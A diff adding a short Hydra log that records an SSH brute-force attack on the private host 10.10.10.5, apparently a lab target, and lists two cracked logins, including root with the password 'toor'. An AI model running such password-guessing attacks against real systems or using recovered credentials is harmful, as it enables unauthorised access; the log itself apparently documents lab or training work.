@@ -1,0 +1,5 @@
+Hydra v9.4 (c) 2022 by van Hauser/THC
+[DATA] attacking ssh://10.10.10.5:22/
+[22][ssh] host: 10.10.10.5   login: admin   password: password123
+[22][ssh] host: 10.10.10.5   login: root   password: toor
+1 of 1 target successfully completed, 2 valid passwords found
